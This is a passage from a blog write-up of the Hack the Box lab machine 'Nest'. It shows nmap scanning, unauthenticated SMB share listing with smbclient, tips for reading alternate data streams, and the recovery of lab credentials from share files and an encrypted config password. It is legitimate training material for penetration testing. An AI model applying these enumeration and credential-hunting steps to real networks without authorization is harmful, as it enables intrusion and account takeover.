<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack the Box - Nest Writeup" /><meta property="og:locale" content="en_US" /><meta name="description" content="Zweilosec’s writeup on the medium-difficulty machine Nest from https://hackthebox.eu" /><meta property="og:description" content="Zweilosec’s writeup on the medium-difficulty machine Nest from https://hackthebox.eu" /><link rel="canonical" href="https://zweilosec.github.io/posts/nest/" /><meta property="og:url" content="https://zweilosec.github.io/posts/nest/" /><meta property="og:site_name" content="Hacker’s Rest" /><meta property="og:image" content="https://zweilosec.github.io/assets/img/nest-infocard.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-05-31T14:00:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://zweilosec.github.io/assets/img/nest-infocard.png" /><meta property="twitter:title" content="Hack the Box - Nest Writeup" /><meta name="twitter:site" content="@zweilosec" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-05-03T22:47:36+00:00","datePublished":"2020-05-31T14:00:00+00:00","description":"Zweilosec’s writeup on the medium-difficulty machine Nest from https://hackthebox.eu","headline":"Hack the Box - Nest Writeup","image":"https://zweilosec.github.io/assets/img/nest-infocard.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://zweilosec.github.io/posts/nest/"},"url":"https://zweilosec.github.io/posts/nest/"}</script><title>Hack the Box - Nest Writeup | Hacker's Rest</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Hacker's Rest"><meta name="application-name" content="Hacker's Rest"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-170504820-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-170504820-1'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/katana.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Hacker's Rest</a></div><div class="site-subtitle font-italic">Notes documenting my journey to OSCP and beyond.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>PS C:\>WHOAMI</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/zweilosec" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/zweilosec" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack the Box - Nest Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack the Box - Nest Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> zweilosec </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, May 31, 2020, 2:00 PM +0000" prep="on" > May 31, 2020 <i class="unloaded">2020-05-31T14:00:00+00:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, May 3, 2021, 3:47 PM -0700" prefix="Updated " > May 3, 2021 <i class="unloaded">2021-05-03T22:47:36+00:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4380 words">24 min</span></div><div><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@zweilosec"></div></div><div class="post-content"><h2 id="htb---nest">HTB - Nest</h2><h2 id="overview">Overview</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/nest-infocard.png" alt="Descriptive information card about the machine nest" /></p><p>This was a fairly easy Windows box that required a bit of back-and-forth between locations and also a little bit of .NET-fu to proceed. Luckily there are tools and websites out there that make disassembling and compiling easy for those who aren’t fluent in VB.Net or C#. This machine is on TJ_Null’s list of OSCP-like machines. Have fun!</p><h2 id="useful-skills-and-tools">Useful Skills and Tools</h2><h3 id="enumerate-smb-without-credentials">Enumerate SMB without credentials</h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>smbclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-L</span> <span class="se">\\</span><span class="nv">$server_IP</span>
</pre></table></code></div></div><h3 id="copying-an-entire-smb-folder-recursively-using-smbclient">Copying an entire SMB folder recursively using smbclient:</h3><blockquote><ol><li>Connect using: <code class="language-plaintext highlighter-rouge">smbclient -U $user \\\\$ip\\$folder $password</code><li>smb: <code class="language-plaintext highlighter-rouge">tarmode</code><li>smb: <code class="language-plaintext highlighter-rouge">recurse</code><li>smb: <code class="language-plaintext highlighter-rouge">prompt</code><li>smb: <code class="language-plaintext highlighter-rouge">mget $folder_to_copy</code></ol></blockquote><h3 id="compile-net-code-online">Compile .NET code online</h3><p>To quickly compile and run any kind of .NET code on the go without having to install Visual Studio and the proper dependencies, I highly recommend the website <a href="https://dotnetfiddle.net/"><code class="language-plaintext highlighter-rouge">https://dotnetfiddle.net/</code></a></p><p><strong>Detecting and reading Alternate Data Streams (ADS) over SMB</strong></p><p>In order to read alternate data streams over SMB, you need to use the <code class="language-plaintext highlighter-rouge">allinfo</code> command, then <code class="language-plaintext highlighter-rouge">Get</code> the file with the appropriate stream name appended to it.</p><ol><li>smb: <code class="language-plaintext highlighter-rouge">allinfo $file</code><li>smb: <code class="language-plaintext highlighter-rouge">get "$filename:$streamname:$DATA"</code></ol><h3 id="dealing-with-unknown-ports">Dealing with unknown ports</h3><p>When dealing with unknown ports, some things to try are:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>nc <span class="nv">$ip</span> <span class="nv">$port</span>
telnet <span class="nv">$ip</span> <span class="nv">$port</span>
SSH <span class="nv">$user</span>@<span class="nv">$ip</span> <span class="nt">-p</span> <span class="nv">$port</span>
</pre></table></code></div></div><h3 id="disassemble-net-binaries">Disassemble .NET binaries</h3><p>Binaries written in .NET languages are fairly simple to break down to the original source code with <a href="https://github.com/icsharpcode/AvaloniaILSpy">https://github.com/icsharpcode/AvaloniaILSpy</a>.</p><h2 id="enumeration">Enumeration</h2><h3 id="nmap-scan">Nmap scan</h3><p>I started my enumeration with an nmap scan of <code class="language-plaintext highlighter-rouge">10.10.10.178</code>. The options I regularly use are:</p><div class="table-wrapper"><table><thead><tr><th style="text-align: left"><code class="language-plaintext highlighter-rouge">Flag</code><th style="text-align: left">Purpose<tbody><tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-p-</code><td style="text-align: left">A shortcut which tells nmap to scan all ports<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-vvv</code><td style="text-align: left">Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sC</code><td style="text-align: left">Equivalent to <code class="language-plaintext highlighter-rouge">--script=default</code> and runs a collection of nmap enumeration scripts against the target<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sV</code><td style="text-align: left">Does a service version scan<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-oA $name</code><td style="text-align: left">Saves all three formats (standard, greppable, and XML) of output with a filename of <code class="language-plaintext highlighter-rouge">$name</code></table></div><p>At first my scan wouldn’t go through until I added the <code class="language-plaintext highlighter-rouge">-Pn</code> flag to stop nmap from sending ICMP probes. After that it proceeded normally. The scan only showed one port open during my initial scan so I ran it again to verify, and it came back with the same results.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/nest$ nmap -p- -A -oA nest.full 10.10.10.178 -Pn

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 15:47 EDT
Nmap scan report for 10.10.10.178
Host is up (0.14s latency).
Not shown: 65534 filtered ports
PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?

Host script results:
|_clock-skew: 4m00s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-05-30T19:56:10
|_  start_date: 2020-05-30T17:04:39

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 330.76 seconds
</pre></table></code></div></div><h2 id="initial-foothold">Initial Foothold</h2><p>Well, nothing else to do but try to connect to SMB without any credentials:</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/nest$ smbclient -U "" -L \\10.10.10.178\
&gt; 
Enter WORKGROUP\'s password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        Secure$         Disk      
        Users           Disk      
SMB1 disabled -- no workgroup available
</pre></table></code></div></div><p>Luckily it worked, and I got back a listing of the shares on this machine. <code class="language-plaintext highlighter-rouge">Data</code>, <code class="language-plaintext highlighter-rouge">Secure$</code>, and <code class="language-plaintext highlighter-rouge">Users</code> all sound interesting as they are not default shares. I first tried connecting to <code class="language-plaintext highlighter-rouge">Secure$</code> but was denied. Next I tried to connect to <code class="language-plaintext highlighter-rouge">Data</code>.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/nest$ smbclient -U "" \\\\10.10.10.178\\Data
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Wed Aug  7 18:53:46 2019
  ..                                  D        0  Wed Aug  7 18:53:46 2019
  IT                                  D        0  Wed Aug  7 18:58:07 2019
  Production                          D        0  Mon Aug  5 17:53:38 2019
  Reports                             D        0  Mon Aug  5 17:53:44 2019
  Shared                              D        0  Wed Aug  7 15:07:51 2019

                10485247 blocks of size 4096. 6543375 blocks available
smb: \&gt;
</pre></table></code></div></div><p>After searching around in the various folders, I found one file that had some interesting information in the <code class="language-plaintext highlighter-rouge">Shared\Templates\HR\</code> folder.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/nest$ cat 'Shared\Templates\HR\Welcome Email.txt' 

We would like to extend a warm welcome to our newest member of staff, &lt;FIRSTNAME&gt; &lt;SURNAME&gt;

You will find your home folder in the following location: 
\\HTB-NEST\Users\&lt;USERNAME&gt;

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019


Thank you
HR
</pre></table></code></div></div><h2 id="road-to-user">Road to User</h2><p>The file <code class="language-plaintext highlighter-rouge">"Welcome Email.txt"</code> contained a set of credentials for the user <code class="language-plaintext highlighter-rouge">TempUser</code>, the location of the user’s folder, and the hostname of the machine: <code class="language-plaintext highlighter-rouge">HTB-NEST</code>. Using this information I once again used <code class="language-plaintext highlighter-rouge">smbclient</code> and logged into the <code class="language-plaintext highlighter-rouge">Users</code> share.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/nest$ smbclient -W HTB-NEST -U TempUser \\\\10.10.10.178\\Users
Enter HTB-NEST\TempUser's password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Sat Jan 25 18:04:21 2020
  ..                                  D        0  Sat Jan 25 18:04:21 2020
  Administrator                       D        0  Fri Aug  9 11:08:23 2019
  C.Smith                             D        0  Sun Jan 26 02:21:44 2020
  L.Frost                             D        0  Thu Aug  8 13:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 13:02:50 2019
  TempUser                            D        0  Wed Aug  7 18:55:56 2019

                10485247 blocks of size 4096. 6543375 blocks available
</pre></table></code></div></div><h3 id="further-enumeration">Further enumeration</h3><p>Hmm…a list of users with accounts on this machine?</p><p>I was now able to access the user folder for <code class="language-plaintext highlighter-rouge">TempUser</code>. However, it only contained a blank text file. I wasn’t able to access anything in the other user’s folders.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>smb: \&gt; cd tempuser
smb: \tempuser\&gt; ls
  .                                   D        0  Wed Aug  7 18:55:56 2019
  ..                                  D        0  Wed Aug  7 18:55:56 2019
  New Text Document.txt               A        0  Wed Aug  7 18:55:56 2019

                10485247 blocks of size 4096. 6545793 blocks available
</pre></table></code></div></div><p>Since that appeared to be a dead-end, I went back and logged into the other network shares. <code class="language-plaintext highlighter-rouge">TempUser</code> was able to access some folders in the <code class="language-plaintext highlighter-rouge">Data</code> share that I wasn’t able to get to before. After searching around for awhile, I came across a couple files with interesting information. In the <code class="language-plaintext highlighter-rouge">\IT\Configs\NotepadPlusPlus\</code> folder there were a couple of .xml files.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>smb: \IT\Configs\NotepadPlusPlus\&gt; ls
  .                                   D        0  Wed Aug  7 15:31:37 2019
  ..                                  D        0  Wed Aug  7 15:31:37 2019
  config.xml                          A     6451  Wed Aug  7 19:01:25 2019
  shortcuts.xml                       A     2108  Wed Aug  7 15:30:27 2019

                10485247 blocks of size 4096. 6545921 blocks available
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">shortcuts.xml</code> file did not have anything useful in it, but <code class="language-plaintext highlighter-rouge">config.xml</code> did.</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="Windows-1252" ?&gt;</span>
<span class="nt">&lt;NotepadPlus&gt;</span>

    ...snipped for brevity...

    <span class="c">&lt;!-- The History of opened files list --&gt;</span>
    <span class="nt">&lt;FindHistory</span> <span class="na">nbMaxFindHistoryPath=</span><span class="s">"10"</span> <span class="na">nbMaxFindHistoryFilter=</span><span class="s">"10"</span> <span class="na">nbMaxFindHistoryFind=</span><span class="s">"10"</span> <span class="na">nbMaxFindHistoryReplace=</span><span class="s">"10"</span> <span class="na">matchWord=</span><span class="s">"no"</span> <span class="na">matchCase=</span><span class="s">"no"</span> <span class="na">wrap=</span><span class="s">"yes"</span> <span class="na">directionDown=</span><span class="s">"yes"</span> <span class="na">fifRecuisive=</span><span class="s">"yes"</span> <span class="na">fifInHiddenFolder=</span><span class="s">"no"</span> <span class="na">dlgAlwaysVisible=</span><span class="s">"no"</span> <span class="na">fifFilterFollowsDoc=</span><span class="s">"no"</span> <span class="na">fifFolderFollowsDoc=</span><span class="s">"no"</span> <span class="na">searchMode=</span><span class="s">"0"</span> <span class="na">transparencyMode=</span><span class="s">"0"</span> <span class="na">transparency=</span><span class="s">"150"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;Find</span> <span class="na">name=</span><span class="s">"text"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;Find</span> <span class="na">name=</span><span class="s">"txt"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;Find</span> <span class="na">name=</span><span class="s">"itx"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;Find</span> <span class="na">name=</span><span class="s">"iTe"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;Find</span> <span class="na">name=</span><span class="s">"IEND"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;Find</span> <span class="na">name=</span><span class="s">"redeem"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;Find</span> <span class="na">name=</span><span class="s">"activa"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;Find</span> <span class="na">name=</span><span class="s">"activate"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;Find</span> <span class="na">name=</span><span class="s">"redeem on"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;Find</span> <span class="na">name=</span><span class="s">"192"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;Replace</span> <span class="na">name=</span><span class="s">"C_addEvent"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/FindHistory&gt;</span>
    <span class="nt">&lt;History</span> <span class="na">nbMaxFile=</span><span class="s">"15"</span> <span class="na">inSubMenu=</span><span class="s">"no"</span> <span class="na">customLength=</span><span class="s">"-1"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;File</span> <span class="na">filename=</span><span class="s">"C:\windows\System32\drivers\etc\hosts"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;File</span> <span class="na">filename=</span><span class="s">"\\HTB-NEST\Secure$\IT\Carl\Temp.txt"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;File</span> <span class="na">filename=</span><span class="s">"C:\Users\C.Smith\Desktop\todo.txt"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/History&gt;</span>
<span class="nt">&lt;/NotepadPlus&gt;</span>
</pre></table></code></div></div><p>This config file contained a history of the text searches and files that had been opened with <a href="https://notepad-plus-plus.org/">Notepad++</a> (My favorite Windows text editor as well, by the way). One item in particular stood out: <code class="language-plaintext highlighter-rouge">\\HTB-NEST\Secure$\IT\Carl\Temp.txt</code>. I decided to keep looking around and come back to that later since I couldn’t access anything in the the <code class="language-plaintext highlighter-rouge">\Secure$\IT\</code> folder as this user.</p><h3 id="finding-user-creds">Finding user creds</h3><p>After searching around a bit more, I found an XML file in <code class="language-plaintext highlighter-rouge">\IT\Configs\RU Scanner\</code> folder that had something interesting.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>smb: \IT\Configs\RU Scanner\&gt; ls
  .                                   D        0  Wed Aug  7 16:01:13 2019
  ..                                  D        0  Wed Aug  7 16:01:13 2019
  RU_config.xml                       A      270  Thu Aug  8 15:49:37 2019

                10485247 blocks of size 4096. 6545777 blocks available
</pre></table></code></div></div><p>Inside this file was some useful information.</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0"?&gt;</span>
<span class="nt">&lt;ConfigFile</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="na">xmlns:xsd=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;Port&gt;</span>389<span class="nt">&lt;/Port&gt;</span>
  <span class="nt">&lt;Username&gt;</span>c.smith<span class="nt">&lt;/Username&gt;</span>
  <span class="nt">&lt;Password&gt;</span>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=<span class="nt">&lt;/Password&gt;</span>
<span class="nt">&lt;/ConfigFile&gt;</span>
</pre></table></code></div></div><p>I now had credentials for another user <code class="language-plaintext highlighter-rouge">c.smith</code>for what appeared to be LDAP (port 389), but the password was obfuscated. It seemed to be Base64, so I decoded it and got this:</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/nest$ echo "fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=" | base64 -d
}13��=X�J�BA�X*�Wc�f���?βc
</pre></table></code></div></div><p>This did not look to be simply base64 encoded. After trying to decode/decrypt the password for a while, I gave up and decided to keep looking.</p><h3 id="decrypting-the-user-creds">Decrypting the user creds</h3><p>That Notepad++ config file from earlier showed a file being opened on the <code class="language-plaintext highlighter-rouge">/Secure$/IT</code> share so I decided to see if I could access the file directly, since I wasn’t able to list files in that directory when I tried earlier.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>smb: \&gt; get \IT\Carl\Temp.txt
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \IT\Carl\Temp.txt
</pre></table></code></div></div><p>Hmm…It didn’t tell me that I didn’t have access to the file, but that file doesn’t seem to exist anymore. Can I get to that folder, then?</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>smb: \&gt; cd \IT\Carl
smb: \IT\Carl\&gt; ls
  .                                   D        0  Wed Aug  7 15:42:14 2019
  ..                                  D        0  Wed Aug  7 15:42:14 2019
  Docs                                D        0  Wed Aug  7 15:44:00 2019
  Reports                             D        0  Tue Aug  6 09:45:40 2019
  VB Projects                         D        0  Tue Aug  6 10:41:55 2019

                10485247 blocks of size 4096. 6545905 blocks available
</pre></table></code></div></div><p>Yes!</p><p><em>I figured that the name of this box must be related to nesting dolls or something like that. The whole time I have had to keep going back to places I had already been to find more information that helped me get a bit further in another place.</em></p><p>After searching around in the <code class="language-plaintext highlighter-rouge">/IT/Carl/</code> folder for awhile, I found a Visual Basic coding project that he had apparently been working on. <code class="language-plaintext highlighter-rouge">RU Scanner</code> was also the name of that config file I found earlier with the encrypted credentials for the <code class="language-plaintext highlighter-rouge">c.smith</code> user, so I knew I had to be on the right track.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>smb: \IT\Carl\VB Projects\WIP\RU\&gt; ls
  .                                   D        0  Fri Aug  9 11:36:45 2019
  ..                                  D        0  Fri Aug  9 11:36:45 2019
  RUScanner                           D        0  Wed Aug  7 18:05:54 2019
  RUScanner.sln                       A      871  Tue Aug  6 10:45:36 2019

                10485247 blocks of size 4096. 6545777 blocks available
